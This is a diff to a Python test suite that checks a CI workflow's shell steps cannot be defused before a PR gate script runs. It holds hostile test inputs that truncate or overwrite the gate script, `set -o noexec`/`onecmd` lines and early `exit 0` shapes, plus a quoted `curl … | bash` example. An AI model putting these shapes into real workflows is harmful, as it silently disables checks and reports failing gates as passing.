@@ -62,6 +62,11 @@ PIP_OPTS = {"--quiet": False, "-q": False, "--verbose": False, "-v": False,
 # is fatal. A whitelist because the blacklist version — refusing only `n` — admitted `set -teuo
 # pipefail`, and `-t` makes bash run one command and exit.
 SET_FLAGS = frozenset("euxEv")
+# The same options under the names `set -o` takes, so one whitelist reads both spellings. Without
+# this, `-o` values were collected and never checked: `set -euo pipefail -o noexec` kept every
+# required letter and turned on `-n`, the option the letter whitelist above exists to refuse.
+# `pipefail` is deliberately absent — it has no single-letter form and is required separately.
+SET_LONG = {"errexit": "e", "nounset": "u", "xtrace": "x", "errtrace": "E", "verbose": "v"}
 TERMINATOR = ("exit", "return")
 KEYWORDS = ("then", "else", "elif", "do", "done", "fi", "esac", "!", "{", "}", "(", ")")
 SHELL_NO_OPS = (":", "true", "false")
@@ -199,6 +204,39 @@ def changed_list(*paths):
     fh.close()
     return fh.name
 
+
+# First, because ~25 later assertions subscript these keys directly and the count invariant is the
+# last thing to print. A check dict missing `gating`, `deps`, `triggers` or `name` raised a KeyError
+# ~100 lines *before* the rule written to report a missing trigger — fourth time in five rounds that a
+# crash discarded the count invariant along with several hundred assertions, and reporting a defect and
+# then tripping over the same data is strictly worse than either alone.
+#
+# So the shape is reported here and then *backfilled*, rather than left to crash a consumer: the
+# reader gets one finding naming the check and the key, and every assertion after it still runs. The
+# defaults are the inert choice in each case — no triggers (selects nothing), no deps, gating (the
+# safe side), and a name that cannot collide.
+print("\nEvery check declares the keys the suite reads")
+REQUIRED_KEYS = ("name", "cmd", "triggers", "deps", "gating")
+
+
+def missing_keys(checks):
+    return sorted((c.get("name", "<unnamed>"), k) for c in checks
+                  for k in REQUIRED_KEYS if k not in c)
+
+
+check("every check declares name, cmd, triggers, deps and gating — the keys read by subscript "
+      "below, so a missing one crashes a consumer rather than reporting here (REQUIRED_KEYS)",
+      not missing_keys(pr_gate.CHECKS), missing_keys(pr_gate.CHECKS))
+check("that rule can actually see a missing key, rather than passing because every check happens "
+      "to be well formed today",
+      missing_keys([{"name": "x", "cmd": None, "triggers": ["a/"], "deps": ()}])
+      == [("x", "gating")])
+for _i, _c in enumerate(pr_gate.CHECKS):
+    _c.setdefault("name", f"<unnamed-{_i}>")
+    _c.setdefault("cmd", None)
+    _c.setdefault("triggers", [])
+    _c.setdefault("deps", ())
+    _c.setdefault("gating", True)
 
 print("\nSelection maps a change to the checks that cover it")
 sel = selected_names(["datasets/sfdmu/qb-pricing/export.json"])
@@ -850,6 +888,19 @@ if os.path.exists(workflow):
             return False
         op = tail[:2] if tail[:2] in ("||", "&&") else tail[:1]
         if op in ("&&", "|"):
+            # ⚠ The `&&` premise below holds only while the `&&` list is the step's **last** command,
+            # and this function is handed one line with no way to know that. Bash exempts a failing
+            # left-hand side of an `&&` list from `set -e`, so the list returns non-zero *without*
+            # aborting, and whatever runs next becomes the step's status. All three verified:
+            #
+            #   false && echo hi                 # as the last line: exit 1 — the safe case
+            #   false && echo hi   ; echo x      # anything after it:  exit 0 — a failing gate, green
+            #   false && exit 0    ; echo x      # exit 0 — the same hole, one word further on
+            #
+            # Note the second: no `exit` is involved, so refusing terminators on the `&&` branch does
+            # not cover it. Lastness is the whole property, and it is a *step*-level fact — enforced
+            # for every step, not just this one, by the `&&`-lastness rule near the step-key checks.
+            # That rule is what this branch's `True` depends on; if it is deleted, this is a hole.
             # These two used to `return True` *before* the walk below, which meant the rewrite that
             # added the walk did not apply to them and two masking tails read as re-raising:
             #
@@ -1308,6 +1359,36 @@ if os.path.exists(workflow):
             governing = pieces[idx - 1].strip() if idx else ""
             return conditional, governing == "||"
 
+        def closes_on_this_line(ln):
+            """Does this line close every block it opens, leaving what follows at top level?
+
+            Both readers of nesting — `terminates` and the walk in `escapes_early` — treated "this
+            line carries an opener" as "everything on this line is inside the block", which is false
+            for the one-line spelling. Counted rather than searched for a keyword, so a line that
+            opens two blocks and closes one stays open.
+            """
+            opens = sum(1 for seg, _ in parts(ln) for w in seg.split()[:1]
+                        if w in SHELL_OPENERS and w != "elif")
+            shuts = sum(1 for seg, _ in parts(ln) for w in seg.split()
+                        if w in ("fi", "done", "esac"))
+            return opens and shuts >= opens
+
+        def after_closers(ln):
+            """The part of a one-line block that sits *outside* it — after the last `fi`/`done`/`esac`.
+
+            The whole point of the distinction: `if C; then exit 0; fi` guards its exit, while
+            `if C; then :; fi; exit 0` does not, and the two differ only in which side of the closer
+            the terminator falls on.
+            """
+            pieces = tokens(ln)
+            last = max((i for i in range(0, len(pieces), 2)
+                        if set(pieces[i].split()) & {"fi", "done", "esac"}), default=None)
+            if last is None:
+                return ln
+            # Everything after the closer's own segment. The closing keyword can share a segment with
+            # what follows it only via a separator, which `tokens` has already split on.
+            return "".join(pieces[last + 1:])
+
         def real_opener(ln):
             """Does this line open a block whose condition can actually go either way?
 
@@ -1358,8 +1439,16 @@ if os.path.exists(workflow):
             # test" then accepted `if [ 1 = 1 ]; then exit 0; fi`, so the test itself is now read:
             # `decided()` says whether its answer is fixed before the shell runs it, over every
             # comparison operator and both unary forms rather than `=` alone.
+            # …unless it also *closes* on this line, in which case only what follows the closer is
+            # top-level. Skipping the whole line for carrying an opener is what made
+            # `if [ -n "${HOME}" ]; then :; fi; exit 0` invisible to both readers at once; reading the
+            # whole line instead over-corrected the other way and called four genuinely guarded exits
+            # unconditional (`if [ -f x ]; then exit 0; fi` — the exit really is conditional there).
+            # The closer is the boundary between the two.
             if real_opener(ln):
-                return False
+                if not closes_on_this_line(ln):
+                    return False
+                ln = after_closers(ln)
             pieces = tokens(ln)
             for i in range(0, len(pieces), 2):
                 seg_words = pieces[i].split()
@@ -1415,8 +1504,17 @@ if os.path.exists(workflow):
                 inherited = stack.pop()[1]
             if stripped.split()[:1] and stripped.split()[0] in ("else", "elif"):
                 stack.append((ind, inherited))
-            elif real_opener(stripped) or (stripped.split()[:1]
-                                           and stripped.split()[0] in SHELL_OPENERS):
+            elif ((real_opener(stripped) or (stripped.split()[:1]
+                                             and stripped.split()[0] in SHELL_OPENERS))
+                  and not closes_on_this_line(stripped)):
+                # Only push when the line leaves the block *open*. A block that opens and closes on
+                # one line — `if [ -n "${HOME}" ]; then :; fi; exit 0` — pushed a real opener that no
+                # dedent then popped, so the `exit 0` sitting after the `fi` on that same line was
+                # read as guarded, and so was everything indented after it. `terminates()` refused it
+                # for a second reason (it saw an opener), so both readers agreed and both were wrong.
+                # Verified: that line under `set -euo pipefail` exits 0 without reaching the next
+                # command. The `while … done; exit 0` spelling is identical; `case … esac` was caught
+                # only incidentally, by vocabulary rather than by any nesting rule.
                 stack.append((ind, real_opener(stripped)))
             if not any(real for _, real in stack) and terminates(ln) and not seen:
                 out.append(stripped)
@@ -1568,6 +1666,20 @@ if os.path.exists(workflow):
         command runs or whether its failure is fatal. Any other letter — real, invalid, or
         inert-looking — has to be added here deliberately, which is a two-word edit and a decision
         someone made on purpose.
+
+        The whitelist then had to cover `-o`'s *values* too, and did not: `opts` was collected and
+        only asked whether `pipefail` was in it, so `set -euo pipefail -o noexec` passed with every
+        required letter present — and `noexec` **is** `-n`, the exact option the paragraph above says
+        the letter whitelist exists to refuse. `-o onecmd` is `-t`, the other one. Both verified: a
+        step opening with either prints nothing and exits 0, so the gate never runs. The long spelling
+        walked through the hole the short spelling was closed for, which is the same defect as a
+        vocabulary with two answers. `SET_LONG` maps the long names onto their letters so both
+        spellings are read by one whitelist; anything not in it is refused.
+
+        That also fixed the mirror-image false rejection. `set -o errexit -o nounset -o pipefail`
+        turns on exactly what is required — bash confirms `false | true` still aborts the step — and
+        was refused under "the step no longer aborts on the first error", which the first paragraph
+        here calls the worst thing a message can do. Folding the names in answers both directions.
         """
         # Read as a word list, not as two fixed orderings. The two alternations pinned `-o pipefail` to
         # the end, so `set -o pipefail -eu` and `set -euo pipefail -x` — both of which turn on
@@ -1596,6 +1708,13 @@ if os.path.exists(workflow):
                 return False
             flags |= set(letters)
             i += 1
+        # `-o` values go through the same whitelist as the letters, via the names bash gives them.
+        # Anything else — `noexec`, `onecmd`, or a name that does not exist — is refused rather than
+        # ignored, which is what let two step-defusing options past a letter whitelist written to
+        # refuse exactly those two options.
+        if not (opts - {"pipefail"}) <= set(SET_LONG):
+            return False
+        flags |= {SET_LONG[o] for o in opts if o in SET_LONG}
         return "pipefail" in opts and {"e", "u"} <= flags <= SET_FLAGS
 
     def set_line_ok(words):
@@ -1861,7 +1980,23 @@ if os.path.exists(workflow):
                      ("set -o pipefail -eun", False),
                      ("set -o pipefail -teu", False),
                      ("set -o pipefail -e", False),
-                     ("set -eu -o noclobber", False)):
+                     # This row passed for the wrong reason — `pipefail` is absent, so it was refused
+                     # without the `-o` value being read at all. A fifth misattributed kill, and the
+                     # rows below are what it was hiding: with `pipefail` present, `-o` took any value.
+                     ("set -eu -o noclobber", False),
+                     # `noexec` is `-n` and `onecmd` is `-t` — the two options the letter whitelist
+                     # exists to refuse, spelled long. Both defuse the step: it prints nothing and
+                     # exits 0, so the gate never runs. Both were accepted.
+                     ("set -euo pipefail -o noexec", False),
+                     ("set -euo pipefail -o onecmd", False),
+                     ("set -o noexec -euo pipefail", False),
+                     ("set -euo pipefail -o notarealoption", False),
+                     # And the mirror-image false rejection: the all-long spelling turns on exactly
+                     # what is required (`false | true` still aborts the step, verified) and was
+                     # refused under the message this rule calls the worst one to get wrong.
+                     ("set -o errexit -o nounset -o pipefail", True),
+                     ("set -o errexit -o nounset -o pipefail -o xtrace", True),
+                     ("set -o errexit -o pipefail", False)):
         check(f"the set-line rule reads {line!r} as {'keeping' if ok else 'losing'} -e/-u/pipefail",
               set_flags_ok(line) is ok, line)
 
@@ -2390,6 +2525,32 @@ if os.path.exists(workflow):
                                               " " * 10 + "fi"))}))
     check("that rule accepts a single-line guarded exit, which opens with `if`",
           not escapes_early(as_step('if [ "$c" -ne 2 ]; then exit "$c"; fi')))
+    # The other side of that boundary. Both readers of nesting treated "this line carries an opener" as
+    # "everything on this line is inside the block", which is false once the block *closes* on the same
+    # line: the terminator after the `fi` is top-level, and the step is gone before the gate runs.
+    # Verified — each of these under `set -euo pipefail` exits 0 without reaching the next command.
+    # `terminates()` refused to read them for a second reason (it saw an opener), so both readers agreed
+    # and both were wrong, which is why neither the nesting probes nor the reachability probes caught it.
+    for label, snippet in (("an exit after a one-line if that closes on it",
+                            'if [ -n "${HOME}" ]; then :; fi; exit 0'),
+                           ("an exit after a one-line while that closes on it",
+                            "while false; do :; done; exit 0"),
+                           ("an exit after a one-line case that closes on it",
+                            'case "${X}" in *) :;; esac; exit 0')):
+        check(f"the reachability rule rejects {label}",
+              escapes_early(as_step("set -euo pipefail", snippet,
+                                    "python scripts/ai/pr_gate.py ${SEL}")),
+              snippet)
+    # And the boundary holds in the guarded direction: same one-line shapes with the terminator *inside*
+    # the block are genuinely conditional and stay accepted. Reading the whole line instead of the part
+    # after the closer called four of these unconditional.
+    for snippet in ('if [ -f x ]; then exit 0; fi',
+                    'if [ -d x ]; then exit 0; fi',
+                    'while [ -n "${X:-}" ]; do exit 0; done'):
+        check(f"and still accepts the guarded exit inside {snippet!r}",
+              not escapes_early(as_step("set -euo pipefail", snippet,
+                                        "python scripts/ai/pr_gate.py ${SEL}")),
+              snippet)
     # The three shapes the line-prefix reading missed. Each was a live false green in the branch-scope
     # step: every command is in `permitted()`'s vocabulary, the invocation and its `code=$?` are
     # untouched, and the shell is gone before either runs.
@@ -2765,8 +2926,19 @@ if os.path.exists(workflow):
     # Two of these are legitimate *targets* whose contents another rule then refuses: nothing may be
     # written to `$GITHUB_PATH` at all, and a `$GITHUB_STEP_SUMMARY` write must be display-only. This
     # list answers "may a step redirect here"; `ALLOWED_WRITES` answers "may it write that".
-    REDIR_TARGETS = ('"$GITHUB_OUTPUT"', '"$GITHUB_ENV"', '"$GITHUB_PATH"', '"$GITHUB_STEP_SUMMARY"',
+    # Stored unquoted and unbraced, because the *spelling* of a target is not the rule — the file it
+    # names is. `hands_over()` accepts `$GITHUB_OUTPUT`, `${GITHUB_OUTPUT}` and the unquoted form (bash
+    # treats all three identically, verified), and the suite asserts that acceptance; this list held
+    # only the quoted-unquoted spelling, so brace-normalising an existing write — a formatting change,
+    # and the workflow already writes `${BASE}` and `${SEL}` braced — failed under "every redirection
+    # writes to a GitHub-provided file … never into the checkout". Eighth instance of one reader
+    # normalising where another compares literally, so the normalisation is shared, not repeated.
+    REDIR_TARGETS = ("$GITHUB_OUTPUT", "$GITHUB_ENV", "$GITHUB_PATH", "$GITHUB_STEP_SUMMARY",
                      "/dev/null")
+
+    def redir_target(text):
+        """A redirection target reduced to the file it names, so one spelling is compared."""
+        return re.sub(r"\$\{(\w+)\}", r"$\1", text.strip().strip('"').strip("'"))
 
     def permitted_job(seg):
         """Wider than `permitted()` — the other two steps resolve a ref and install pins — but still a
@@ -3025,22 +3197,38 @@ if os.path.exists(workflow):
         # The descriptor is *consumed*, not excluded. This was `(?<![0-9<>])`, a negative lookbehind
         # that threw away the entire match whenever a digit preceded the `>` — so `2>`, `1>` and `2>>`
         # never had a target extracted and never reached `REDIR_TARGETS` at all. `echo x 2>
-        # scripts/ai/pr_gate.py` in the installer step passed all 370 workflow assertions and truncates
+        # scripts/ai/pr_gate.py` in the installer step passed every workflow assertion then present (370 of
+        # them; the figure has moved since) and truncates
         # the script the next step runs, which then exits 0 having checked nothing. `>&` slipped for a
         # second reason: the target began with `&`, which the character class refused.
         #
         # It also falsified the stated reason another rule limits its own subject set ("redirections()
         # already refuses every other target"), which is the more general hazard: a rule that under-reads
         # lends its authority to every rule that cites it.
+        # `>|` is a redirection too — a force-truncate that defeats `noclobber`. The target class
+        # excludes `|`, so `echo x >| scripts/ai/pr_gate.py` matched nothing here and was caught only
+        # because `tokens()` split on the `|` and left a stray segment for the *vocabulary* rule. A
+        # kill by a neighbouring rule is the attribution defect this file records four times, and it
+        # matters here for the reason in the paragraph above: another rule cites this one's coverage.
         found = []
         for ln in shell_of(step):
-            for m in re.finditer(r"(?<![<>])\d*>>?\s*(&?)\s*([^\s;&|)]+)", ln):
+            # The pattern is quote-blind, so `echo "a > b"` — which writes nothing, verified — was
+            # reported as a redirection into the checkout, and `echo "::notice::use > carefully"` is a
+            # shape the annotation whitelist explicitly invites. Quoted spans are *skipped by offset*
+            # rather than blanked: blanking them took the target with them, and the regex then
+            # backtracked onto the second `>` of `>>` and called that the target, which failed all three
+            # of the workflow's own legitimate writes.
+            quoted = {i for m in re.finditer(r"\"[^\"]*\"|'[^']*'", ln)
+                      for i in range(*m.span())}
+            for m in re.finditer(r"(?<![<>])\d*>>?\|?\s*(&?)\s*([^\s;&|)]+)", ln):
+                if m.start() in quoted:
+                    continue
                 dup, target = m.group(1), m.group(2)
                 # `2>&1` and `>&2` duplicate a descriptor and name no file, so there is nothing to write
                 # into the checkout. Required, or the permitted `>/dev/null 2>&1` fails its own rule.
                 if dup and target.isdigit():
                     continue
-                if target not in REDIR_TARGETS:
+                if redir_target(target) not in REDIR_TARGETS:
                     found.append(ln.strip())
         return found
 
@@ -3191,6 +3379,45 @@ if os.path.exists(workflow):
           "admission in `tail_preserves_status` depends on pipefail holding everywhere (extra flags "
           "such as -x are fine; SET_FLAGS lists them)",
           not bad_openers, bad_openers or openers)
+    # The premise `tail_preserves_status` admits `&&` on, enforced for every step rather than assumed
+    # for one. Bash exempts the left-hand side of an `&&` list from `set -e`, so a failing command
+    # there returns non-zero *without* aborting and the step's status becomes whatever runs next:
+    #
+    #   false && echo hi                 → exit 1   (last line: the failure is the step's status)
+    #   false && echo hi   ; echo x      → exit 0   (a failing gate, reported green)
+    #
+    # All verified. The second needs no `exit` and no second operator, which is why this is a
+    # positional rule and not a vocabulary one: the same text is safe or catastrophic depending only on
+    # whether anything follows it. `&&` on the final command line is genuinely fine and is a shape a
+    # maintainer plausibly writes (`gate && echo "::notice::gate green"`), so it is admitted there.
+    cmd_lines = [(s.get("name") or "<unnamed>", shell_of(s)) for s in job_steps if "run" in s]
+    late_and = [(n, ln.strip()) for n, lns in cmd_lines
+                for i, ln in enumerate(lns)
+                if "&&" in [p.strip() for p, _ in parts(ln)] + [t.strip()[:2] for _, t in parts(ln)]
+                and any(later.strip() and not later.strip().startswith("#")
+                        for later in lns[i + 1:])]
+    check("an `&&` list is the last command of its step — bash exempts its left-hand side from set -e, "
+          "so a failing command there does not abort and the next line's status becomes the step's; "
+          "`&&` on the final line is fine and is what `tail_preserves_status` admits it for",
+          not late_and, late_and)
+
+    def and_lastness(step):
+        lns = shell_of(step)
+        return [ln.strip() for i, ln in enumerate(lns)
+                if "&&" in [p.strip() for p, _ in parts(ln)] + [t.strip()[:2] for _, t in parts(ln)]
+                and any(later.strip() and not later.strip().startswith("#")
+                        for later in lns[i + 1:])]
+
+    for label, tail in (("a masking exit on the success branch", "&& exit 0"),
+                        ("nothing but an annotation after it", '&& echo "::notice::green"')):
+        check(f"that rule rejects an `&&` list with {label} and a line after it",
+              and_lastness(as_step("set -euo pipefail",
+                                   f"python scripts/ai/pr_gate.py ${{SEL}} {tail}",
+                                   'echo "::notice::done"')), tail)
+    check("and accepts the same `&&` as the step's final command, which is the shape a maintainer "
+          "writes and where bash makes the failure the step's status",
+          not and_lastness(as_step("set -euo pipefail",
+                                   'python scripts/ai/pr_gate.py ${SEL} && echo "::notice::green"')))
     stray = [(s.get("name"), seg.strip()) for s in job_steps if "run" in s
              for ln in shell_of(s) for seg, _ in parts(ln) if not permitted_job(seg)]
     check("every command in every step is one the job exists to run, so no step can rewrite what a "
@@ -3202,6 +3429,23 @@ if os.path.exists(workflow):
     redirs = [(s.get("name"), r) for s in job_steps if "run" in s for r in redirections(s)]
     check("and every redirection writes to a GitHub-provided file or /dev/null, never into the "
           "checkout", not redirs, redirs[:4])
+    # A `>` inside a quoted string writes nothing — verified — and `::notice::` text is exactly where one
+    # plausibly appears, so reporting it was a false rejection of a shape the annotation whitelist above
+    # explicitly invites. Two directions, because the first repair (blanking quoted spans) took the real
+    # target with them and the pattern backtracked onto the second `>` of `>>`, failing all three of the
+    # workflow's own legitimate writes.
+    check("a `>` inside a quoted string is text, not a redirection",
+          not redirections(as_step("set -euo pipefail", 'echo "::notice::use > carefully"')))
+    check("and a real redirection on the same line is still read",
+          redirections(as_step("set -euo pipefail",
+                               'echo "a > b" > scripts/ai/pr_gate.py')))
+    # The target's *spelling* is not the rule; the file it names is. `hands_over()` accepts three
+    # spellings and this list held one, so brace-normalising an existing write — a formatting change, in
+    # a workflow that already writes `${BASE}` and `${SEL}` braced — failed under "never into the
+    # checkout". Eighth instance of one reader normalising where another compares literally.
+    for target in ('"$GITHUB_OUTPUT"', "$GITHUB_OUTPUT", '"${GITHUB_OUTPUT}"', "${GITHUB_OUTPUT}"):
+        check(f"a write to {target} is read as the same GitHub-provided file",
+              not redirections(as_step("set -euo pipefail", f'echo "ref=x" >> {target}')), target)
     for label, snippet in (("a script overwritten by a redirection",
                             "echo 'import sys; sys.exit(0)' > scripts/ai/pr_gate.py"),
                            # Every redirection in this table used a plain `>`, which is why a descriptor
@@ -3236,7 +3480,14 @@ if os.path.exists(workflow):
                            ("an assignment smuggled through printf -v",
                             "printf -v SEL %s '--base HEAD'"),
                            ("a process substitution behind a permitted echo",
-                            "echo <(cp /dev/null scripts/ai/pr_gate.py)")):
+                            "echo <(cp /dev/null scripts/ai/pr_gate.py)"),
+                           # `>|` is a redirection — a force-truncate that overrides `noclobber` — and
+                           # the target class excluded `|`, so this matched no redirection at all. It
+                           # died only because `tokens()` split on the `|` and left a segment the
+                           # *vocabulary* rule refused, which is a kill by a neighbouring rule: the
+                           # fifth recorded here, and the reason the target class now admits it.
+                           ("a script force-truncated past noclobber",
+                            "echo x >| scripts/ai/pr_gate.py")):
         step = as_step("set -euo pipefail", snippet)
         check(f"those two rules reject {label}",
               [seg for ln in shell_of(step) for seg, _ in parts(ln) if not permitted_job(seg)]
@@ -4019,9 +4270,11 @@ check("the generated install payload is non-empty, so the rules below are not va
 # assertion in this section. The payload is a function of *which checks are selected*, so the comparison
 # has to select all of them the other way round — a path-driven selection, which is what CI does.
 with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
-    fh.write("\n".join(sorted({c["triggers"][0].rstrip("/") + "/probe.md"
-                               if c["triggers"][0].endswith("/") else c["triggers"][0]
-                               for c in pr_gate.CHECKS})))
+    # `triggers[0]` twice on a list the shape rule allows to be empty; floored for the same reason as
+    # the per-check loop below.
+    fh.write("\n".join(sorted({t.rstrip("/") + "/probe.md" if t.endswith("/") else t
+                               for c in pr_gate.CHECKS
+                               for t in (c["triggers"] or ["_no_trigger_declared/"])[:1]})))
     selection_list = fh.name
 emitted_paths = [ln for ln in run_gate("--requirements", "--changed-files-from", selection_list)[1]
                  .splitlines() if ln.strip()]
@@ -4167,7 +4420,7 @@ check("a failing gating check reaches the FAILED line and a non-zero exit, so a 
 # its own first trigger must select it, and with every runner stubbed to fail, its name must reach the
 # failure accounting and turn the gate red.
 real_run, real_seq, real_git = pr_gate.run, pr_gate.run_sequence, pr_gate.git
-real_changed, real_argv = pr_gate.changed_files, sys.argv
+real_changed, real_argv, real_deps = pr_gate.changed_files, sys.argv, pr_gate.missing_deps
 
 
 def gate_verdict(probe, failing):
@@ -4195,12 +4448,22 @@ def gate_verdict(probe, failing):
         pr_gate.run_sequence = lambda cmds: (max(fails(c) for c in cmds), "stubbed", 0.0)
         pr_gate.git = lambda argv, what: " M x\n"
         pr_gate.changed_files = lambda base, _p=probe: [_p]
+        # Dependency detection stubbed too, or this rule proves something different on every machine.
+        # `missing_deps` probes the real interpreter, and a check blocked on a missing dependency is
+        # booked *before* its runner is reached — so on an interpreter without pytest, PyYAML, textual
+        # or cumulusci, six of the fourteen checks were asserted through the MISSING-DEP path while the
+        # message claimed the run path, and the stubbed runner never ran at all. Which six varied with
+        # the machine, so a maintainer's local green proved less than CI's. Same shape as the four
+        # misattributed kills recorded in the README: the assertion passed for a reason other than the
+        # one it names.
+        pr_gate.missing_deps = lambda check: []
         sys.argv = ["pr_gate.py", "--base", "HEAD"]
         with redirect_stdout(buf):
             rc = pr_gate.main()
     finally:
         pr_gate.run, pr_gate.run_sequence, pr_gate.git = real_run, real_seq, real_git
         pr_gate.changed_files, sys.argv = real_changed, real_argv
+        pr_gate.missing_deps = real_deps
     return rc, buf.getvalue()
 
 
@@ -4209,7 +4472,11 @@ def probe_path(trig, ext=".md"):
 
 
 for spec in list(pr_gate.CHECKS):
-    probe = probe_path(spec["triggers"][0])
+    # `triggers[0]` on an empty list is an IndexError here, and this loop sits above the count
+    # invariant — the shape rule near the top of the file reports `triggers=[]` and the backfill makes
+    # it `[]` rather than absent, so the subscript still needs a floor. A path no check claims selects
+    # nothing, which is the honest outcome: the check under probe is reported unbooked.
+    probe = probe_path((spec["triggers"] or ["_no_trigger_declared/"])[0])
     rc, printed = gate_verdict(probe, spec)
     def listed(marker):
         # `split(marker)[-1]` returns the *whole* string when the marker is absent, so an absent
@@ -4661,7 +4928,7 @@ if FAILED:
 # spelled `run: curl -s http://host/x | bash` produced no [FAIL] at all, just a request to bump an
 # integer. (It now fails a whitelist too, since `raw_shell_of` reads inline scalars — but the
 # message had to stop inviting that response either way.)
-EXPECTED = 640
+EXPECTED = 666
 REACHED = PASSED + len(FAILED)
 if REACHED < EXPECTED:
     print(f"only {REACHED} of {EXPECTED} checks reached a verdict — a rule stopped running, which is "
